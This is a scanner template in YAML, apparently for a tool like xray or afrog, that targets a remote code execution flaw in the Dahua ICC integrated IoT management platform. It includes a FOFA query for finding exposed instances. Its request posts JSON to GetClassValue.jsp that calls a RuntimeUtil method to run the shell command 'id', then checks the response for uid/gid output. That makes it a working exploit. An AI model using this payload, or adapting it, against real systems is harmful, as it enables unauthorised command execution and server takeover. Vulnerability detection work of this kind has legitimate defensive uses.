id: dahua-icc-getclassvalue-rce

info:
  name: 大华 ICC 智能物联综合管理平台 GetClassValue RCE
  author: avic123
  severity: critical
  verified: true
  description: |-
    大华智能物联综合管理平台GetClassValue.jsp存在远程代码执行漏洞，攻击者可获取服务器权限
    fofa: app="dahua-智能物联综合管理平台"
  reference:
    - https://cn-sec.com/archives/3585607.html
  tags: dahua,icc,rce
  created: 2025/01/06

rules:
  r0:
    request:
      method: POST
      path: /evo-apigw/admin/API/Developer/GetClassValue.jsp
      headers:
        Content-Type: application/json
      body: |
        {
          "data": {
            "clazzName": "com.dahua.admin.util.RuntimeUtil",
            "methodName": "syncexecReturnInputStream",
            "fieldName": ["id"]
          }
        }
    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
expression: r0()
